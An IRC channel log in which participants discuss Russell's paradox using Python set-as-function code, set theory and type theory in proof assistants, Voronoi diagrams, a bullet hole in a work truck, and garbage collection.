[01:45:15] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[01:45:19] *** Joins: hnOsmium0001[m] (~hnosmium0@2001:470:69fc:105::15d4)
[01:45:19] *** Joins: nicoty (~nicoty@user/nicoty)
[01:45:20] *** Quits: hsiktas[m] (~hsiktasma@2001:470:69fc:105::30d4) (Quit: Client limit exceeded: 20000)
[01:45:26] *** Quits: saltrocklamp[m] (~hexology@user/hexology) (Quit: Client limit exceeded: 20000)
[01:45:29] *** Joins: zaher_ (~zaher@37.48.191.217)
[01:45:35] <nomagno> I'm not sure you want to run s(s)
[01:45:35] <jinsun> depends on s
[01:45:41] <[itchyjunk]> so s(s) checks if s \in s
[01:45:42] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[01:45:58] *** Quits: ForeverNoob[m] (~foreverno@2001:470:69fc:105::8c6) (Quit: Client limit exceeded: 20000)
[01:45:59] *** Joins: saltrocklamp[m] (~hexology@user/hexology)
[01:46:02] *** Quits: spokojni[m] (~spokojnio@2001:470:69fc:105::1:3fb2) (Quit: Client limit exceeded: 20000)
[01:46:04] <[itchyjunk]> in theory, some simple set A should take A(A) and return false
[01:46:04] *** Joins: jkk (~jkk@gateway/tor-sasl/jkk)
[01:46:09] <[itchyjunk]> since A does not contain itself
[01:46:11] *** Joins: ForeverNoob[m] (~foreverno@2001:470:69fc:105::8c6)
[01:46:14] *** Joins: hsiktas[m] (~hsiktasma@2001:470:69fc:105::30d4)
[01:46:23] *** Quits: Alpha3031[m] (~alpha3031@wikipedia/alpha3031) (Quit: Client limit exceeded: 20000)
[01:46:28] *** Joins: spokojni[m] (~spokojnio@2001:470:69fc:105::1:3fb2)
[01:46:28] <nomagno> This isn't lambda calculus, it's not going to end up being very funny unless you make s sync up with global state
[01:46:28] <jinsun> that is defined at the top
[01:46:30] <jinsun> empty
[01:46:43] *** Quits: jinsun_ (~jinsun@user/jinsun) (Quit: Client limit exceeded: 20000)
[01:46:43] *** Joins: Alpha3031[m] (~alpha3031@wikipedia/alpha3031)
[01:46:46] *** Quits: ZombieMaster[m] (~zombiemas@2001:470:69fc:105::1:e4d) (Quit: Client limit exceeded: 20000)
[01:46:49] *** Quits: dan01[m] (~dan01@2001:470:69fc:105::1:2640) (Quit: Client limit exceeded: 20000)
[01:46:52] <sonny> yeah, seems like s(s) just loops forever
[01:46:54] *** Quits: milia[m] (~mlliarmma@2001:470:69fc:105::1:4631) (Quit: Client limit exceeded: 20000)
[01:46:55] *** Quits: akselmo (~akselmo@user/akselmo) (Quit: Client limit exceeded: 20000)
[01:46:57] *** Joins: jinsun_ (~jinsun@user/jinsun)
[01:46:59] <CoJaBo> Reddit: *goes down lol*    Literally Our Users: FIX IT! FIXIT! FIXITFIXITFIXIT! FIXITFIXITFIXIT! FIXXX IIIT!!!1
[01:47:05] <[itchyjunk]> okay i think i understand!
[01:47:09] *** Joins: ZombieMaster[m] (~zombiemas@2001:470:69fc:105::1:e4d)
[01:47:13] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:b9ca:7580:971f:87f4) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[01:47:15] <[itchyjunk]> sonny, no
[01:47:20] *** Joins: dan01[m] (~dan01@2001:470:69fc:105::1:2640)
[01:47:21] *** Joins: milia[m] (~mlliarmma@2001:470:69fc:105::1:4631)
[01:47:29] <[itchyjunk]> s(blah) takes blah and check if blach in s
[01:47:36] *** Joins: akselmo (~akselmo@user/akselmo)
[01:47:36] *** Quits: rvlobato[m] (~ronaldo@2001:470:69fc:105::219f) (Quit: Client limit exceeded: 20000)
[01:47:46] *** Quits: gloomy (~gloomy@2001:470:69fc:105::ce00) (Quit: Client limit exceeded: 20000)
[01:48:01] *** Quits: sillymob[m] (~sillymobm@2001:470:69fc:105::1:3c6d) (Quit: Client limit exceeded: 20000)
[01:48:02] *** Quits: twoten[m] (~twotensam@2001:470:69fc:105::1:55aa) (Quit: Client limit exceeded: 20000)
[01:48:02] *** Quits: freshgum[m] (~freshgum_@2001:470:69fc:105::c1a5) (Quit: Client limit exceeded: 20000)
[01:48:06] *** Joins: rickybob (~rickybob@gateway/vpn/pia/rickybob)
[01:48:08] <sonny> it calls containsSelf
[01:48:11] <jkk> whats the new irc?
[01:48:12] <jinsun> s(s) loops forever if you give russel to it because it goes back and forth between containsSelf(russel) and russell(russel)
[01:48:21] <sonny> mutal recursion
[01:48:23] *** Joins: sillymob[m] (~sillymobm@2001:470:69fc:105::1:3c6d)
[01:48:23] <[itchyjunk]> why would it call contains self?
[01:48:34] <[itchyjunk]> jinsun, right if  you give it russel
[01:48:36] <sonny> `def russell(x): return not containsSelf(x)`
[01:48:36] *** Joins: twoten[m] (~twotensam@2001:470:69fc:105::1:55aa)
[01:48:36] *** Joins: rvlobato[m] (~ronaldo@2001:470:69fc:105::219f)
[01:48:36] *** Joins: freshgum[m] (~freshgum_@2001:470:69fc:105::c1a5)
[01:48:36] *** Joins: gloomy (~gloomy@2001:470:69fc:105::ce00)
[01:48:37] <jkk> pyzozord: what's your irc?
[01:48:39] <[itchyjunk]> i think it makes sense
[01:48:47] <sonny> what do you want to do?
[01:48:55] *** Quits: JCHammons[m] (~jchbitmas@2001:470:69fc:105::8350) (Quit: Client limit exceeded: 20000)
[01:48:57] <[itchyjunk]> sonny, it loops forever if you give it russle
[01:49:02] <jkk> sonny: discuss some quantum computing
[01:49:04] <jkk> on new ir
[01:49:08] <jkk> irc
[01:49:09] *** Joins: JCHammons[m] (~jchbitmas@2001:470:69fc:105::8350)
[01:49:12] *** Quits: Dave[m]1 (~fiseeyeem@2001:470:69fc:105::7c4a) (Quit: Client limit exceeded: 20000)
[01:49:13] <[itchyjunk]> i wanted to understand why its infinite loop for special case of russle and not others
[01:49:25] <sonny> because of mutal recursion
[01:49:29] *** Joins: Dave[m] (~fiseeyeem@2001:470:69fc:105::7c4a)
[01:49:30] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[01:49:36] *** Quits: potatoxel[m] (~potatoxel@2001:470:69fc:105::f026) (Quit: Client limit exceeded: 20000)
[01:49:44] *** Quits: scubagear[m] (~scubagear@2001:470:69fc:105::1:5dee) (Quit: Client limit exceeded: 20000)
[01:49:47] *** Quits: nworb (~zbrownm]@2001:470:69fc:105::1:33db) (Quit: Client limit exceeded: 20000)
[01:50:13] <[itchyjunk]> because of undecidebility
[01:50:17] <sonny> I'm surprised s(s) works in python, I know their scoping is weird
[01:50:30] <[itchyjunk]> this example is somehow giving us an insight to the halting problem
[01:50:36] <sonny> explain
[01:50:47] <[itchyjunk]> i can't, this was an exercise given in #proglangdesign 
[01:50:49] <[itchyjunk]> :D
[01:50:55] <[itchyjunk]> you better ask the creator of the problem
[01:51:07] <sonny> I don't see how this is the halting problem
[01:51:13] *** Parts: jkk (~jkk@gateway/tor-sasl/jkk) ()
[01:51:18] <sonny> because I know this will not terminate
[01:51:48] <[itchyjunk]> this will half for some input
[01:51:53] *** Joins: scubagear[m] (~scubagear@2001:470:69fc:105::1:5dee)
[01:51:54] *** Joins: potatoxel[m] (~potatoxel@2001:470:69fc:105::f026)
[01:51:54] *** Joins: nworb (~zbrownm]@2001:470:69fc:105::1:33db)
[01:51:54] <[itchyjunk]> from what i understand
[01:52:02] <[itchyjunk]> containsSelf(A) for some simple set A should half
[01:52:05] <[itchyjunk]> halt*
[01:52:25] <sonny> halting problem is can you tell if a program will halt, and the answer is no unless you can run it?
[01:52:25] <jinsun> well the simple cases are empty and everything
[01:52:43] <jinsun> it will give results in both those cases
[01:53:38] <[itchyjunk]> hmm could you elaborate please?
[01:53:44] <[itchyjunk]> with a simple set A = {1,2} or somesuch
[01:53:48] <[itchyjunk]> containsSelf(A)
[01:53:50] <[itchyjunk]> what happens?
[01:54:15] *** Joins: shokohsc (~shokohsc@lfbn-idf2-1-630-171.w86-246.abo.wanadoo.fr)
[01:54:16] *** Quits: Reign (~Username@ip98-161-226-10.ph.ph.cox.net) (Quit: Going offline, see ya! (www.adiirc.com))
[01:54:27] <sonny> same deal
[01:54:31] <jinsun> containsSelf(empty) gives False and containsSelf(everything) gives True
[01:55:15] <[itchyjunk]> ohhh
[01:55:32] <jinsun> containsSelf(union(just(3), just(4))) also gives False
[01:56:19] <bjs> [itchyjunk]: if this is about Russel's paradox, then the paradox only arises when  you have unrestricted (and infinite) sets
[01:56:20] *** Joins: zaher__ (~zaher@188.160.231.240)
[01:56:38] <[itchyjunk]> it is about russle paradox and i think i am back to being confused
[01:56:56] <[itchyjunk]> how is jinsun able to parse this? i can't seem to
[01:56:58] <bjs> [itchyjunk]: the set {1,2} does not contain itself.
[01:57:12] <[itchyjunk]> constainSelf(empty) evluates to empty(empty()) right? 
[01:57:21] <[itchyjunk]> but the inside empty is waiting for a parameter
[01:57:26] *** Quits: berkhan (~berkhan@159.146.43.146) (Ping timeout: 245 seconds)
[01:57:28] <bjs> [itchyjunk]: I think containsSelf doesn't return a set, it just returns a boolean
[01:57:35] <[itchyjunk]> yes that i get
[01:57:40] <jinsun> `emptly(empty)` not `empty(empty())`
[01:57:50] <bjs> [itchyjunk]: so containsSelf(empty) is False, because the empty set doesn't contain the empty set
[01:58:02] <jinsun> doesn't matter what input is though, it just returns False
[01:58:02] <[itchyjunk]> jinsun, how does the innermost empty work?
[01:58:07] <sonny> containsSelf gives the result of s()
[01:58:37] <bjs> [itchyjunk]: {} and {{}} are different sets
[01:58:37] <[itchyjunk]> bjs, so far sogood
[01:58:37] *** Quits: danielrparks (~quassel@2600:1700:3f7b:20f:633a:15c4:4784:e28a) (Ping timeout: 240 seconds)
[01:58:43] <[itchyjunk]> yes i understand
[01:58:44] <bjs> [itchyjunk]: you can have sets that contain other sets.
[01:58:46] <jinsun> [itchyjunk]: it is just a function object, that gets passed to the "outer" empty, and the function body ignores it and returns False
[01:58:55] <[itchyjunk]> sure, so sets can contain sets
[01:59:14] <[itchyjunk]> jinsun, ahh okay that removes some confusion then
[01:59:21] <sonny> jinsun how does scoping work in python, I dunno what the s(s) inside is
[01:59:27] <bjs> [itchyjunk]: if the sets are infinite, the set could contain itself.  Imagine the set `e = {e}`
[01:59:29] <[itchyjunk]> so contsinsSelf(everything) should return true everytime
[01:59:46] <[itchyjunk]> okay, a set could contain itself
[02:00:18] <bjs> [itchyjunk]: but any set that contains itself is "infinite" in some sense
[02:00:21] *** Quits: zaher_ (~zaher@37.48.191.217) (Ping timeout: 256 seconds)
[02:00:35] *** Quits: sinhue (~mithrin@188-167-233-152.dynamic.chello.sk) (Quit: Leaving)
[02:00:45] <jinsun> sonny: s(s) will try to call s with s as the first argument, that is not problematic because s object is defined already before it is called
[02:00:46] <sonny> yeah, I imagine
[02:00:49] *** Quits: kinduff[m] (~kinduffma@2001:470:69fc:105::1:5e09) (Quit: Client limit exceeded: 20000)
[02:01:19] <sonny> jinsun this is super confusing
[02:01:31] *** Joins: kinduff[m] (~kinduffma@2001:470:69fc:105::1:5e09)
[02:01:57] <[itchyjunk]> You're super confusing!
[02:02:06] *** Quits: federico_it (~textual@151.34.11.93) (Read error: Connection reset by peer)
[02:02:08] <sonny> no, this code is
[02:02:16] <sonny> I'm rather clear
[02:02:22] <[itchyjunk]> okay so constainsSelf(russell) calls russell(russell)
[02:02:42] <[itchyjunk]> which recurses because of containsSelf in the def
[02:02:43] *** Quits: scoobydoo (~scooby@user/scoobydoo) (Read error: Connection timed out)
[02:02:48] <sonny> yeah
[02:03:11] <[itchyjunk]> i am telling you think is somehow related to halting problem
[02:03:17] * [itchyjunk] waves hand in the air
[02:03:18] <[itchyjunk]> somehow
[02:03:22] <jinsun> sonny: for example when you run `def s(x): return True` it defines a function s that takes a parameter and returns True, later when you do s(s), s is passed in place of x and you get True because that's what the function is defined to return
[02:03:46] *** Joins: scoobydoo (~scooby@user/scoobydoo)
[02:03:52] <sonny> so it's not a lambda?
[02:04:20] <sonny> this is so broken lol
[02:04:54] <jinsun> no, but it doesn't matter, you can write a lambda to do the same thing, s = lambda x: True, then s(s) will give True
[02:05:05] <sonny> [itchyjunk] put anything in containsSelf I bet it will hang
[02:05:20] <bjs> [itchyjunk]: jinsun's code is defining a set as a function `elem -> bool`, which returns True if the thing is in the set. containsSelf just asks if the set is in itself, the `russell` function is just an infinite loop. containsSelf calls russel which calls containSelf which calls russel
[02:05:24] <[itchyjunk]> no, empty should return false
[02:05:27] <[itchyjunk]> like we discussed
[02:05:42] <bjs> [itchyjunk]: I'm not sure this code is very... insightful or useful if you want to know about Russel's paradox
[02:05:52] <[itchyjunk]> i wanted to know about sets
[02:06:12] <sonny> python has builtin sets
[02:06:15] <bjs> [itchyjunk]: the issue with Russel's paradox is when you allow any definition of a set. Specifically if you're allowed to say "the set of all sets"
[02:06:23] <bjs> sonny: yes,  but you can't have infinite sets in Python
[02:06:32] <[itchyjunk]> this is kinda related to what ProfSimp was asking
[02:06:38] <sonny> you can't even deefine this example?
[02:06:58] <[itchyjunk]> are you saying its invalid syntax?
[02:07:02] <bjs> sonny: you cannot get Russel's paradox in Python's sets, because Python sets are all finite
[02:07:05] <[itchyjunk]> it looks like it was defined on an interpreter
[02:07:25] *** Joins: federico_it (~textual@151.34.200.47)
[02:07:29] <[itchyjunk]> i was asking how a mathematica object call sets can exist in computer
[02:07:30] *** Joins: morte_ (~user@190.104.116.153)
[02:07:41] <[itchyjunk]> the answer it, you can represent something that behaves like a set
[02:07:54] <[itchyjunk]> but the mathematical idea itself cannot exist as an implementation blah blah
[02:07:59] <[itchyjunk]> i think that part i now understand
[02:08:02] <[itchyjunk]> argh
[02:08:08] <bjs> [itchyjunk]: well Python's `set` is also just a representation that pretends to be a set
[02:08:21] <[itchyjunk]> yes all implementations are like that
[02:08:31] <bjs> a good representation is a function, because that makes infinite sets easy
[02:08:43] *** Quits: Ilyu_ (~quassel@gateway/vpn/pia/ilyu) (Ping timeout: 256 seconds)
[02:08:46] <[itchyjunk]> yes this is an example of set as functions i think
[02:08:50] <sonny> will haskell be better for this?
[02:08:53] <sonny> it can handle inf
[02:08:55] <bjs> sonny: better how?
[02:09:00] *** Joins: Ilyu (~quassel@gateway/vpn/pia/ilyu)
[02:09:02] <[itchyjunk]> the follow up to this is supposed to be a paper
[02:09:08] <[itchyjunk]> but no way am i gonna read a paper
[02:09:08] *** Joins: maxzor_ (~maxzor@2a01cb04054faa004cde64db429acd32.ipv6.abo.wanadoo.fr)
[02:09:08] *** Quits: maxzor_ (~maxzor@2a01cb04054faa004cde64db429acd32.ipv6.abo.wanadoo.fr) (Client Quit)
[02:09:09] <[itchyjunk]> sounds hard
[02:09:12] <sonny> lol
[02:09:18] <sonny> how long is it?
[02:09:20] <[itchyjunk]> this is the paper 
[02:09:20] <[itchyjunk]> http://tac.mta.ca/tac/reprints/articles/15/tr15.pdf
[02:09:21] <bayaz> Type: application/pdf Size: 135.0 kB 
[02:09:22] <bjs> sonny: well I mean,  the code from jinsun also handles inf just fine
[02:09:27] <[itchyjunk]> short
[02:09:29] <[itchyjunk]> 14 pages
[02:09:31] <PlanckWalk> Some theorem-proving systems can do a decent job of representing mathematical sets
[02:09:37] <[itchyjunk]> its not code from jinsun 
[02:09:38] <sonny> notation and representatino looks so much better
[02:09:46] <sonny> I wouldn't be confused
[02:09:47] *** Joins: maxzor_ (~maxzor@2a01cb04054faa004cde64db429acd32.ipv6.abo.wanadoo.fr)
[02:09:48] <[itchyjunk]> it's corbin's code, a category theorist
[02:09:51] <[itchyjunk]> from #proglangdesign 
[02:10:01] <[itchyjunk]> everything on computer is confusing
[02:10:11] <jinsun> [itchyjunk]: there was a good video about Russel's paradox just 2-days back https://www.youtube.com/watch?v=n4kBhD8-hH0 , did the discussion start because of that
[02:10:12] <bayaz> Title: The set of all sets -- Russell's Paradox. 
[02:10:32] *** Quits: maxzor (~maxzor@2a01cb04054faa0019a1450716269dba.ipv6.abo.wanadoo.fr) (Remote host closed the connection)
[02:10:41] <PlanckWalk> There are set theories that have a set of all sets, but don't suffer from Russell's paradox.
[02:10:50] <jinsun> well #proglangdesign so maybe not
[02:10:59] <[itchyjunk]> no the discussion started because i wanted to know how it is possible to represent something with no ordering and almost no structur eon a computer because how do you know if S is a set, wether s in S or not
[02:11:12] *** Joins: maxzor (~maxzor@2a01cb04054faa00745d5fe5c290fd5e.ipv6.abo.wanadoo.fr)
[02:11:20] <[itchyjunk]> turns out you create data structures that behave like set but had more structure internally than the mathematical counterpart
[02:11:56] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[02:12:20] <PlanckWalk> Mathematical sets can have arbitrarily, even infinitely, complicated internal structure.
[02:12:23] <[itchyjunk]> i wonder if any of this has anything to do with why set thoery based proof assistance are rare
[02:12:38] <[itchyjunk]> well an ordered set can have ordering
[02:12:45] <[itchyjunk]> but i mean set before any such structure is defined
[02:12:49] <PlanckWalk> So do I
[02:12:49] <[itchyjunk]> a generic set S 
[02:12:57] <bjs> [itchyjunk]: modern set theory doesn't have Russels paradox
[02:14:06] *** Quits: Inari (~Pinkishu@p4fe7e008.dip0.t-ipconnect.de) (Quit: KVIrc 5.0.0 Aria http://www.kvirc.net/)
[02:14:39] <[itchyjunk]> i suppose so
[02:15:11] <[itchyjunk]> i can't remember why most proof assistance don't like set theory based thingy
[02:15:14] <[itchyjunk]> and go for type theory
[02:15:17] <[itchyjunk]> like Coq
[02:15:42] * KillerWasp cook [itchyjunk] 
[02:15:59] * [itchyjunk] puts KillerWasp inside KillerWasp 
[02:16:13] <PlanckWalk> Set theory can be pretty opaque.
[02:16:27] <KillerWasp> i want share something of hot from here...
[02:16:43] <PlanckWalk> In order to get anything to actually prove interesting things about, you need to do lots of structural encoding into set theory terms.
[02:16:44] <sonny> <https://setl.org/doc/setl.html>
[02:16:56] <KillerWasp> http://bluebeacon.blackrook.xyz/index.php?l=en&p=1
[02:16:56] <bayaz> Title: BLUE-BEACON! 
[02:17:08] <KillerWasp> it's good?
[02:17:20] <KillerWasp> most the translations.
[02:17:43] <KillerWasp> i use the last option for change the language
[02:18:05] <PlanckWalk> E.g. to prove "this thing is a natural number" you need to do stuff like prove that this thing (which is a set, because in set theory everything is a set) satisfies all the requirements for being whatever structure you defined to represent natural numbers.
[02:18:18] <KillerWasp> i still don't know what put in the option 3.
[02:18:29] <PlanckWalk> That sort of thing is a real pain.
[02:19:02] <[itchyjunk]> KillerWasp, the english is understandable but could be better
[02:19:14] <[itchyjunk]> yeah, encoding set and such is too much problem
[02:19:21] <[itchyjunk]> how does type theory skirt around this issue?
[02:19:37] <PlanckWalk> It has different types to begin with
[02:19:40] <[itchyjunk]> they somehow introduce type Nat and 3 is an element of it?
[02:19:45] <PlanckWalk> Yes
[02:20:19] <[itchyjunk]> I feel like this stuff hasn't clicked in yet.. i need to go back to simply typed lambda calc, i can't rememebr what i didn't understand but i stopped for some reason
[02:20:31] <PlanckWalk> Later you can introduce type Real and every Nat is a real, without uttery rewriting every aspect of the representations.
[02:20:57] *** Quits: scoobydoo (~scooby@user/scoobydoo) (Read error: Connection timed out)
[02:21:15] <PlanckWalk> E.g. in the standard mathematical construction representation of the reals in set theory, you usually start with naturals and then construct insanely complicated structures on top of that.
[02:21:17] <[itchyjunk]> is that where homotopy type theory comes in where nat is type equivalent to real? wait that won't work
[02:21:35] <PlanckWalk> But then you get a representation in which no natural number set is a real number set.
[02:21:36] <[itchyjunk]> i guess Z+ and Nat\{0} are homotopy equivalent?
[02:22:04] <PlanckWalk> So you do some "surgery" and replace some of the reals with natural numbers.  Or worse, you don't.
[02:22:26] *** Joins: scoobydoo (~scooby@user/scoobydoo)
[02:22:42] *** Quits: Klinda (~superleag@user/klinda) (Quit: Konversation terminated!)
[02:22:43] <[itchyjunk]> Naturals semi ring to Z rings to Q field to R via dedikind or somesuch
[02:22:47] <[itchyjunk]> i think i vaguely remember that
[02:22:48] <PlanckWalk> Yes
[02:25:30] <PlanckWalk> Also, one downside is that sqrt(2) is represented by an infinite set, which is a bit tricky in computer representations.
[02:26:20] <PlanckWalk> Well, technically I guess so is -1, but it's a lot more tractable to represent that one.
[02:27:36] <PlanckWalk> In that step there's a uniform way to collapse all those infinite sets into a finite representation.
[02:28:01] <PlanckWalk> Same with the step from Z to Q.  Not from Q to R though.
[02:28:47] *** Quits: federico_it (~textual@151.34.200.47) (Quit: Textual IRC Client: www.textualapp.com)
[02:30:05] *** Joins: Macuser (~Macuser@2600:1003:b46e:747e:c053:f977:a2d4:e642)
[02:31:23] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Read error: Connection reset by peer)
[02:32:37] *** Quits: pizdets (~pizdets@183.182.110.125) (Ping timeout: 240 seconds)
[02:32:47] *** Quits: gitesh (uid423739@id-423739.ilkley.irccloud.com) (Quit: Connection closed for inactivity)
[02:34:06] *** Joins: pizdets (~pizdets@183.182.110.139)
[02:37:52] *** Quits: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com) (Read error: Connection reset by peer)
[02:37:56] *** Joins: atom951 (~atom951@2a02:c7f:1f58:500:30dc:962d:f2cb:6bb9)
[02:38:03] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[02:38:40] *** Joins: EdFletcher (~PKD@user/edfletcher)
[02:39:13] *** Joins: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com)
[02:40:55] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[02:41:55] *** Joins: flakland (~flaknet99@32.211.211.39)
[02:43:11] <atom951> Hi, I'm trying to find information about an algorithm for segmenting a space (ie. 2d plane) by proximity to a set of points so that each segment is identified with the point that it is closest to. I remember seeing a visualisation of bubbles growing out from the points until they collide and form straight boundaries. Maybe my google fu is bad, but
[02:43:11] <atom951> I can't for the life of my find information on this. If anyone can just point me in the right direction with an algorithm name or even a succint way to describe this problem I'd be much appeciated!
[02:43:31] *** Quits: Seirdy (~Seirdy@sourcehut/user/seirdy) (Quit: exiting 3.3)
[02:43:57] <PlanckWalk> Voronoi
[02:44:02] *** Joins: Seirdy (~Seirdy@sourcehut/user/seirdy)
[02:44:12] <atom951> Perfect, thank you1
[02:44:36] <PlanckWalk> There are interesting algorithms for it :)
[02:45:25] <flakland> hopefully the points don't move
[02:46:34] <PlanckWalk> There are interesting algorithms for that too
[02:46:55] *** Joins: scoobydoo_ (~scooby@user/scoobydoo)
[02:47:05] *** Joins: BrianG61UK__ (~BrianG61U@2a02:8010:66b7:dddd:95d8:317a:8f88:31cf)
[02:47:28] *** Joins: Camilo (~hugh@83.151.206.23)
[02:48:08] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:1457:faae:10f6:45e5) (Ping timeout: 252 seconds)
[02:48:26] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:1457:faae:10f6:45e5)
[02:48:41] *** Quits: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:95d8:317a:8f88:31cf) (Ping timeout: 252 seconds)
[02:49:57] *** Quits: scoobydoo (~scooby@user/scoobydoo) (Ping timeout: 240 seconds)
[02:50:02] *** scoobydoo_ is now known as scoobydoo
[02:52:00] *** Joins: whatsupdoc (uid509081@id-509081.hampstead.irccloud.com)
[02:52:40] *** Joins: paulo (paulo@user/paulo/x-9032687)
[02:55:52] *** Joins: astroid (astroid@2605:6400:20:434:35e6:c487:2aff:9aec)
[02:55:52] *** Quits: astroid (astroid@2605:6400:20:434:35e6:c487:2aff:9aec) (Changing host)
[02:55:52] *** Joins: astroid (astroid@user/astroid)
[02:55:56] <pulse> this looks cool https://i.imgur.com/ezOmYCB.jpg
[02:55:57] <bayaz> Type: image/jpeg Size: 68.2 kB 
[02:56:15] *** Quits: x_kuru_ (~xkuru@user/xkuru) (Read error: Connection reset by peer)
[02:56:55] *** Joins: quazimodo (~quazimodo@n1-41-223-188.bla2.nsw.optusnet.com.au)
[02:57:25] <flakland> dat kerning tho
[02:57:26] <CoJaBo> Wtf, someone shot our truck
[02:58:52] <flakland> ok call da cops
[02:59:00] <CoJaBo> We don't actually know when it happened. Coworker pulled up to a light after it started raining, and water dumped down on her head
[02:59:15] <CoJaBo> Or where. It was parked a ton of places the past few days :/
[02:59:26] *** Quits: LucaTM (~LucaTM@user/lucatm) (Quit: Textual IRC Client: www.textualapp.com)
[02:59:43] <flakland> wtf did they shoot it with, a cannonball?
[03:00:21] <sonny> lol
[03:00:34] <CoJaBo> No idea
[03:00:39] <CoJaBo> It's shot thru the roof at a weird angle
[03:00:51] <CoJaBo> She couldn't find the bullet
[03:01:17] <pulse> who shoots into a roof
[03:01:19] <flakland> maybe it was a disgruntled mantis shrimp
[03:01:19] <CoJaBo> I find weird stuff under the seats all the time, so that's not terribly surprising if it pinballed around in there after
[03:01:31] <CoJaBo> pulse: Retards.
[03:01:40] <CoJaBo> Given the amount of "Omg, bullet hole in my X" posts on social media the past couple days, I'm guessing it happened around NYE
[03:02:02] *** Quits: medium_cool_ (~medium_co@2605:a601:a9aa:f800:c45a:1cfb:b6d9:9c5a) (Quit: I have gone to sleep. ZZZzzz…)
[03:02:02] <pulse> maybe it was a firecracker
[03:02:32] <flakland> maybe, but what is terminal velocity of a bullet vs how thick is the steel roof?
[03:02:46] *** ovh is now known as riff-IRC
[03:02:57] <CoJaBo> If it's still intact, I wonder if they can CSI it
[03:03:06] <pulse> actually, if someone shoots into the air, that could happen, i think
[03:03:17] <pulse> the bullet has enough kinetic energy to penetrate a car's roof
[03:03:23] <pulse> ... i think
[03:03:25] <flakland> from freefall?
[03:03:29] <pulse> yeah
[03:03:30] *** Quits: plastico (~plastico@neomutt/plastico) (Quit: WeeChat 3.4)
[03:03:34] <flakland> hmm
[03:03:38] <pulse> it's enough to go through a window, i'm sure of that much
[03:03:59] <pulse> (the reinforced kind)
[03:04:13] <CoJaBo> To get a bullet to freefall, you have to shoot it very near 90° straight up. It's very hard to do that, Mythbusters got that one wrong.
[03:04:40] <flakland> mythbusters got everything wrong
[03:04:57] *** Quits: Camilo (~hugh@83.151.206.23) (Ping timeout: 256 seconds)
[03:04:58] <CoJaBo> All I've got are terrible older-android-phone-with-a-cracked-lens pics, but it looks like it entered damn near *horizontal*
[03:05:43] <pulse> wouldn't a bullet accumulate kinetic energy even if falling at an angle
[03:05:50] <flakland> have you sent it to a meteorite lab to analyze it's metallic composition yet?
[03:06:02] <pulse> or does it just glide in that case and never reach terminal velocity
[03:06:37] <CoJaBo> We're trying to find a sound on the dashcam to identify where it struck. But these only record on motion, I think, so that's probably gonna be a bust
[03:06:49] <pulse> https://en.wikipedia.org/wiki/Celebratory_gunfire#Property_damage
[03:06:50] <bayaz> Title: Celebratory gunfire - Wikipedia 
[03:06:57] <pulse> if it can penetrate a building roof ... *shrug*
[03:07:15] <CoJaBo> Yeh, vehicle roofs are NOT bulletproof lol
[03:07:22] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[03:07:36] *** Joins: flakland (~flaknet99@32.211.211.39)
[03:07:47] <pulse> shooting into the air seems extremely stupid tbh
[03:07:48] <flakland> anything can be bulletproof its far enough away
[03:07:51] <flakland> if its
[03:08:27] *** Quits: yitz (~yitz@exercism/yitz) (Quit:  )
[03:08:28] <edgar-rft> pulse: shooting into your head doen't sound more clever
[03:09:15] *** Joins: yitz (~yitz@exercism/yitz)
[03:09:22] <pulse> i remember watching a documentary about someone who was killed while driving a car by a bullet that someone was using to kill fish in a pond with, the bullet ricocheted off an underwater rock, went into air, and then landed right in the neck of the person who was driving a car on a highway
[03:09:54] <pulse> they speculated it wouldn't killed him if he had his windows rolled up
[03:11:00] *** Quits: atom951 (~atom951@2a02:c7f:1f58:500:30dc:962d:f2cb:6bb9) (Quit: Client closed)
[03:12:06] <edgar-rft> the only way not to get killed acidentally in extremely stupid ways is avoiding birth by all means
[03:12:09] *** Quits: lexano[m] (~lexanomat@2001:470:69fc:105::3110) (Quit: Client limit exceeded: 20000)
[03:12:11] <CoJaBo> There's apparently about one person a year killed in texas by shooting at armadillos
[03:12:24] *** Joins: lexano[m] (~lexanomat@2001:470:69fc:105::3110)
[03:12:29] *** Quits: xff0x_ (~xff0x@2001:1a81:5335:ab00:175a:eec8:110f:8c7e) (Ping timeout: 250 seconds)
[03:12:40] <pulse> goes to show that you gotta max out luck when you're making your rl character
[03:12:41] <[itchyjunk]> bullet bouncing back and killing you?
[03:12:48] <[itchyjunk]> i thought that only happened in cartoon network
[03:13:08] <flakland> a ricochet probably implies bullet shrapnel
[03:13:34] *** Joins: xff0x_ (~xff0x@2001:1a81:5335:ab00:6ff0:ac84:9d3f:2b35)
[03:13:42] <edgar-rft> [itchyjunk]: it obviously also happens while making documentaries :-)
[03:15:07] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[03:15:19] *** Joins: flakland (~flaknet99@32.211.211.39)
[03:15:23] *** Quits: mrig (~mrig@user/mrig) (Quit: WeeChat 3.0)
[03:15:32] *** xff0x_ is now known as xff0x
[03:17:16] <sonny> system programmers, remind me what the big deal is with garbage collection again?
[03:17:28] <InPhase> sonny: Define "big deal".
[03:17:37] <pulse> something something not having to worry about memory
[03:17:48] <pulse> in other words use new as much as you want and don't ever bother about delete
[03:17:58] <sonny> InPhase system programmers seem to complain about it
[03:18:09] <flakland> sonny, imagine an aircraft trying to land, and then it hits a 20-200 millisecond freeze from GC running
[03:18:11] <pulse> that's because it's slow and typically non-deterministic
[03:18:40] *** Quits: horseface (~horseface@user/horseface) (Ping timeout: 268 seconds)
[03:18:56] <sonny> flakland you have to collect memory at some point
